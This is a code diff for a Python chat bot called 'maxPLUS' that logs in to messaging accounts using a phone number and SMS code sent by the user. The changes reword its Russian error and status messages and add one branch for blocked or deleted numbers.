@@ -103,7 +103,7 @@ async def is_approved_group(msg: Message) -> bool:
         return await is_group_approved(msg.chat.id)
     return False
 
-# === Главное меню (текст) ===
+# === Главное меню ===
 def main_menu_text():
     return (
         "👋 Приветствуем вас в боте maxPLUS\\.\n\n"
@@ -329,13 +329,15 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
         error_name = type(e).__name__.lower()
 
         if "2fa" in error_text or "password" in error_text:
-            await msg.answer("❌ На этом номере включена двухфакторная аутентификация. Авторизация невозможна")
+            await msg.answer("❌ На номере включена двухфакторная аутентификация. Авторизация невозможна. Повторная попытка через 7 дней")
+        elif "blocked" in error_text or "recovery" in error_text:
+            await msg.answer("❌ Номер заблокирован или удалён. Восстановлению не подлежит, используйте другой номер")
         elif "auth" in error_name or "code" in error_text or "token" in error_text:
-            await msg.answer("❌ Неверный код или номер заблокирован")
+            await msg.answer("❌ Неверный код подтверждения. Проверьте правильность ввода и повторите попытку")
         elif "connect" in error_name or "network" in error_text or "timeout" in error_text:
-            await msg.answer("❌ Проблемы с сетью. Попробуй позже")
+            await msg.answer("❌ Проблемы с сетью. Проверьте подключение к интернету и попробуйте позже")
         elif "already" in error_text or "session" in error_text:
-            await msg.answer("ℹ️ Этот номер уже авторизован")
+            await msg.answer("❌ Этот номер уже был авторизован ранее, повторный вход не требуется")
         else:
             await msg.answer(f"❌ Ошибка: {e}")
     finally:
@@ -344,7 +346,7 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
 async def code_as_reply(msg: Message):
     if msg.from_user.id not in pending:
         waiting_code.pop(msg.from_user.id, None)
-        return await msg.answer("❌ Сессия устарела. Отправь номер заново")
+        return await msg.answer("❌ Сессия устарела. Отправьте номер заново")
 
     code = msg.text.strip()
 
@@ -355,7 +357,7 @@ async def code_as_reply(msg: Message):
     provider = data["provider"]
     waiting_code.pop(msg.from_user.id, None)
     await provider.set_code(code)
-    await msg.answer("✅ Код принят, авторизую...")
+    await msg.answer("📩 Код принят, запущен процесс авторизации. Ожидайте завершения...")
 
 async def main():
     await init_db()
